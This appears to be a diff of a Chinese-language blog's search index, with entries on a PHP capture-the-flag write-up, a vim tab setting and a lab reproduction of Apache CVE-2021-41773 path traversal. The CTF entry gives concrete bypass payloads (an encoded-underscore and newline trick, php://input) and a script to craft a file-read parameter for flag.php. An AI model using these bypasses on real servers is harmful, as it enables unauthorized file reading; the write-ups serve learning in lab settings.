-<p>一个例子： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 计算 Shanghai 在字符串中出现的次数</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> substr_count(<span class="string">&quot;I love Shanghai. Shanghai is the biggest city in china.&quot;</span>,<span class="string">&quot;Shanghai&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>结果为：2</p>
-<p>注意：该函数区分大小写。将上面例子稍作修改： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 计算 shanghai 在字符串中出现的次数</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> substr_count(<span class="string">&quot;I love Shanghai. Shanghai is the biggest city in china.&quot;</span>,<span class="string">&quot;shanghai&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>此时结果为：0</p>
-<h3 id="preg_matchpattern-string">2.1.3. preg_match(pattern, string)</h3>
-<p>PHP中的正则匹配，返回值是匹配次数。<strong>它的值为0或者1</strong>，这是因为第一次匹配到的时候就会结束该函数。如果需要一直搜索到结尾，可以使用preg_match_all(pattern, string)。</p>
-<p>需要注意的是，正则匹配默认都是匹配一行的，如果需要匹配多行，需要在正则表达式的最后加上<code>m</code>。</p>
-<h3 id="getip">2.1.4. getIp()</h3>
-<p>源码如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>] &amp;&amp; strcasecmp(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>], <span class="string">&quot;unknown&quot;</span>)) &#123;</span><br><span class="line">        <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_CLIENT_IP&quot;</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>] &amp;&amp; strcasecmp(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>], <span class="string">&quot;unknown&quot;</span>)) &#123;</span><br><span class="line">            <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_X_FORWARDED_FOR&quot;</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] &amp;&amp; strcasecmp(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>], <span class="string">&quot;unknown&quot;</span>)) &#123;</span><br><span class="line">                <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] &amp;&amp; strcasecmp(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],</span><br><span class="line">                        <span class="string">&quot;unknown&quot;</span>)</span><br><span class="line">                ) &#123;</span><br><span class="line">                    <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$ip</span> = <span class="string">&quot;unknown&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (<span class="variable">$ip</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> getIp();</span><br></pre></td></tr></table></figure></p>
-<p>简单总结一下就是该函数通过HTTP头部中的<code>client-ip</code>来获取客户端的IP。</p>
-<h2 id="解题过程">2.2. 解题过程</h2>
-<h3 id="套娃1">2.2.1. 套娃1</h3>
-<p>根据代码审计可以知道：</p>
-<ul>
-<li>要绕过if，即查询语句不能包含<code>_</code>以及<code>%5f</code>，后者就是前者url编码之后的结果；</li>
-<li>b_u_p_t的值不能为23333，又得满足preg_match函数的返回值为1</li>
-</ul>
-<p>因为substr_count()函数区分大小写，因此可以使用大小写绕过，即<code>%5F</code>即可。</p>
-<p>而preg_match默认只匹配一行，假设我们输入如下：(%oa是换行符的url编码) <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">23333%0a</span><br></pre></td></tr></table></figure></p>
-<p>那么preg_match函数只匹配第一行，第一行只有23333，因此满足以23333开头，以23333结尾的要求，从而返回值为1。并且，此时的值不是23333，因为最后有一个换行符，因此绕过强类型匹配。</p>
-<p>从而payload为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?b%5Fu%5Fp%5Ft=23333%0a</span><br></pre></td></tr></table></figure></p>
-<p>得到如下提示：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220421094613.png" /></p>
-<h3 id="套娃2">2.2.2. 套娃2</h3>
-<p>去访问对应的文件，得到如下提示：（我还以为改一下XFF就可以，天真） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Flag is here~But how to get it?Local access only!  </span><br><span class="line">Sorry,you don&#x27;t have permission! Your ip is :sorry,this way is banned!</span><br></pre></td></tr></table></figure></p>
-<p>查看源码，得到一串不知名的注释，这里有一个小技巧，可以将这个注释放入控制台执行。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220421094919.png" /></p>
-<p>因此POST请求，带入参数Merak，得到如下源码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = base64_decode(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= chr ( ord (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = getIp();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>从源码中可以得到以下信息：</p>
-<ul>
-<li>flag应该在flag.php中</li>
-<li>这里获得客户端IP不是通过XFF，而是通过client-ip</li>
-<li>GET方式传入2333，并且得满足<code>file_get_contents($_GET['2333']) === 'todat is a happy day'</code></li>
-<li>利用最后的file_get_contents()读取flag.php中的内容，但是需要经过change()函数</li>
-</ul>
-<p>第三点可以通过<code>php://input [POSTt] odat is happy day</code>绕过。</p>
-<p>这里主要说面一下change函数的绕过。我们的目的是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">change($_GET[&#x27;file&#x27;]) -&gt; flag.php</span><br></pre></td></tr></table></figure></p>
-<p>即，我们输入payload，经过change函数，变成flag.php。因此我们可以根据change函数写出它的逆过程。代码如下： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">v</span>):</span>  </span><br><span class="line">    re = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">    v = base64.b64decode(v).decode(<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment"># byte -&gt; str  </span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(v)):  </span><br><span class="line">        re += <span class="built_in">chr</span>((<span class="built_in">ord</span>(v[i]) + i*<span class="number">2</span>))  </span><br><span class="line">          </span><br><span class="line">    <span class="keyword">return</span> re  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unchange</span>(<span class="params">fileName</span>):</span>  </span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(fileName)):  </span><br><span class="line">         payload += <span class="built_in">chr</span>(<span class="built_in">ord</span>(fileName[i]) - <span class="number">2</span>*i)  </span><br><span class="line">  </span><br><span class="line">    payload = base64.b64encode(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>)) <span class="comment"># str -&gt; byte  </span></span><br><span class="line">    <span class="keyword">return</span> payload.decode(<span class="string">&#x27;utf-8&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    fileName = <span class="string">&#x27;flag.php&#x27;</span>  </span><br><span class="line">    payload = unchange(fileName)  </span><br><span class="line">    <span class="built_in">print</span>(payload)  <span class="comment"># 最终的payload</span></span><br><span class="line">    <span class="built_in">print</span>(change(payload)) <span class="comment"># 验证是否正确</span></span><br></pre></td></tr></table></figure></p>
-<p>最后得到payload为：ZmpdYSZmXGI=</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220421095706.png" /></p>
-<h1 id="总结">3. 总结</h1>
-<p>考察了：</p>
-<ul>
-<li>substr_count()区分大小写</li>
-<li>php://input伪协议绕过</li>
-<li>函数逆向</li>
-</ul>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>PHP伪协议</tag>
-        <tag>PHP基础知识</tag>
-        <tag>函数逆向</tag>
       </tags>
   </entry>
   <entry>
@@ -4301,6 +4301,27 @@
       </tags>
   </entry>
   <entry>
+    <title>vim缩进问题</title>
+    <url>/2022/04/07/vim%E7%BC%A9%E8%BF%9B%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<p>记录了关于Linux中vim的缩进问题。</p>
+<span id="more"></span>
+<h1 id="问题描述">问题描述</h1>
+<p>之前有一次编写完脚本运行时，发现不停的报错，信息为 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TabError: Inconsistent use of tabs and spaces in indentation</span><br></pre></td></tr></table></figure></p>
+<p>也就是告诉我缩进出现了错误。可是我检查了好几遍代码，确定不存在这样的缩进错误，于是上网搜索，终于找到了解决方案。</p>
+<h1 id="解决方案">解决方案</h1>
+<p>首先进入 <code>/etc/vim/vimrc</code>，然后在文件最后加入下面几行： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set tabstop=4</span><br><span class="line">set softtabstop=4</span><br><span class="line">set shiftwidth=4</span><br><span class="line">set expandtab</span><br><span class="line">set autoindent</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407094249.png" /></p>
+<p>然后就可以成功运行脚本了。</p>
+<p>总结一下就是在vim空格键与制表符不能混用，混用时就会出现报错</p>
+]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>vim</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>python challenge 题解</title>
     <url>/2022/01/29/python%20challenge%20%E9%A2%98%E8%A7%A3/</url>
     <content><![CDATA[<p>这是个人的 python challenge 的刷题记录，网址是：<a href="http://www.pythonchallenge.com/">python challenge</a>。更多内容请点击 <strong>阅读全文</strong>，如有错误，欢迎在评论区指出。</p>
@@ -4626,27 +4647,6 @@
       </tags>
   </entry>
   <entry>
-    <title>vim缩进问题</title>
-    <url>/2022/04/07/vim%E7%BC%A9%E8%BF%9B%E9%97%AE%E9%A2%98/</url>
-    <content><![CDATA[<p>记录了关于Linux中vim的缩进问题。</p>
-<span id="more"></span>
-<h1 id="问题描述">问题描述</h1>
-<p>之前有一次编写完脚本运行时，发现不停的报错，信息为 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TabError: Inconsistent use of tabs and spaces in indentation</span><br></pre></td></tr></table></figure></p>
-<p>也就是告诉我缩进出现了错误。可是我检查了好几遍代码，确定不存在这样的缩进错误，于是上网搜索，终于找到了解决方案。</p>
-<h1 id="解决方案">解决方案</h1>
-<p>首先进入 <code>/etc/vim/vimrc</code>，然后在文件最后加入下面几行： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set tabstop=4</span><br><span class="line">set softtabstop=4</span><br><span class="line">set shiftwidth=4</span><br><span class="line">set expandtab</span><br><span class="line">set autoindent</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220407094249.png" /></p>
-<p>然后就可以成功运行脚本了。</p>
-<p>总结一下就是在vim空格键与制表符不能混用，混用时就会出现报错</p>
-]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>vim</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>windows 上CD驱动器的删除问题</title>
     <url>/2022/03/28/windows%20%E4%B8%8ACD%E9%A9%B1%E5%8A%A8%E5%99%A8%E7%9A%84%E5%88%A0%E9%99%A4%E9%97%AE%E9%A2%98/</url>
     <content><![CDATA[<p>记录个人日常生活中遇到的繁琐的小问题的解决。</p>
@@ -4673,6 +4673,56 @@
       </categories>
       <tags>
         <tag>Windows小知识</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>复现：Apache HTTP Server 2.4.49 路径穿越漏洞（CVE-2021-41773）</title>
+    <url>/2022/03/24/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTP%20Server%202.4.49%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-41773%EF%BC%89/</url>
+    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
+<span id="more"></span>
+<h1 id="漏洞信息">漏洞信息</h1>
+<p>Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：</p>
+<ul>
+<li><p>版本等于2.4.49</p></li>
+<li><p>穿越的目录允许被访问，比如配置了<code>&lt;Directory /&gt;Require all granted&lt;/Directory&gt;</code>。（默认情况下是不允许的）</p></li>
+</ul>
+<p>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p>
+<p>参考链接：</p>
+<ul>
+<li><p>https://httpd.apache.org/security/vulnerabilities_24.html</p></li>
+<li><p>https://twitter.com/ptswarm/status/1445376079548624899</p></li>
+<li><p>https://twitter.com/HackerGautam/status/1445412108863041544</p></li>
+<li><p>https://twitter.com/snyff/status/1445565903161102344</p></li>
+</ul>
+<p>路径：</p>
+<ul>
+<li><code>vulhub-master/httpd/CVE-2021-41773</code></li>
+</ul>
+<p>运行漏洞环境：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build  </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
+<h1 id="复现">复现</h1>
+<p>进入环境，显示如下则环境搭建成功。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231656.png" /></p>
+<p>先刷新，抓个包，然后将请求地址修改为如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231754.png" /></p>
+<p>结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231803.png" /></p>
+<p>成功得到文件的内容，因此证明存在此漏洞。</p>
+<p>需要注意的是，<code>icons</code> 需要为目标主机存在且可访问的目录。<code>%2e</code> 是 <code>.</code> 的 url 编码，如果直接在浏览器输入的话，要输入 <code>.</code> 。</p>
+<p>接下来改变请求的方式，发送如下请求：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324232016.png" /></p>
+<p>结果如下：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324232026.png" /></p>
+<p>成功执行命令。</p>
+<h1 id="总结">总结</h1>
+<p>今天刷的一套题就是类似的路径穿越漏洞（<a href="https://buuoj.cn/challenges">BUUCTF</a> 中的 <strong>我有一个数据库</strong>），这类的题目还是需要平时多记录。</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Apache</tag>
       </tags>
   </entry>
   <entry>
@@ -4805,56 +4855,6 @@
       </categories>
       <tags>
         <tag>PHP反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>复现：Apache HTTP Server 2.4.49 路径穿越漏洞（CVE-2021-41773）</title>
-    <url>/2022/03/24/%E5%A4%8D%E7%8E%B0%EF%BC%9AApache%20HTTP%20Server%202.4.49%20%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-41773%EF%BC%89/</url>
-    <content><![CDATA[<p>个人的漏洞复现练习，请多批评！</p>
-<span id="more"></span>
-<h1 id="漏洞信息">漏洞信息</h1>
-<p>Apache HTTP Server是Apache基金会开源的一款流行的HTTP服务器。在其2.4.49版本中，引入了一个路径穿越漏洞，满足下面两个条件的Apache服务器将会受到影响：</p>
-<ul>
-<li><p>版本等于2.4.49</p></li>
-<li><p>穿越的目录允许被访问，比如配置了<code>&lt;Directory /&gt;Require all granted&lt;/Directory&gt;</code>。（默认情况下是不允许的）</p></li>
-</ul>
-<p>攻击者利用这个漏洞，可以读取位于Apache服务器Web目录以外的其他文件，或者读取Web目录中的脚本文件源码，或者在开启了cgi或cgid的服务器上执行任意命令。</p>
-<p>参考链接：</p>
-<ul>
-<li><p>https://httpd.apache.org/security/vulnerabilities_24.html</p></li>
-<li><p>https://twitter.com/ptswarm/status/1445376079548624899</p></li>
-<li><p>https://twitter.com/HackerGautam/status/1445412108863041544</p></li>
-<li><p>https://twitter.com/snyff/status/1445565903161102344</p></li>
-</ul>
-<p>路径：</p>
-<ul>
-<li><code>vulhub-master/httpd/CVE-2021-41773</code></li>
-</ul>
-<p>运行漏洞环境：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build  </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
-<p>然后输入：<code>http://ip:8080</code> 即可访问</p>
-<h1 id="复现">复现</h1>
-<p>进入环境，显示如下则环境搭建成功。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231656.png" /></p>
-<p>先刷新，抓个包，然后将请求地址修改为如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231754.png" /></p>
-<p>结果如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324231803.png" /></p>
-<p>成功得到文件的内容，因此证明存在此漏洞。</p>
-<p>需要注意的是，<code>icons</code> 需要为目标主机存在且可访问的目录。<code>%2e</code> 是 <code>.</code> 的 url 编码，如果直接在浏览器输入的话，要输入 <code>.</code> 。</p>
-<p>接下来改变请求的方式，发送如下请求：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324232016.png" /></p>
-<p>结果如下：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220324232026.png" /></p>
-<p>成功执行命令。</p>
-<h1 id="总结">总结</h1>
-<p>今天刷的一套题就是类似的路径穿越漏洞（<a href="https://buuoj.cn/challenges">BUUCTF</a> 中的 <strong>我有一个数据库</strong>），这类的题目还是需要平时多记录。</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>Apache</tag>
       </tags>
   </entry>
   <entry>
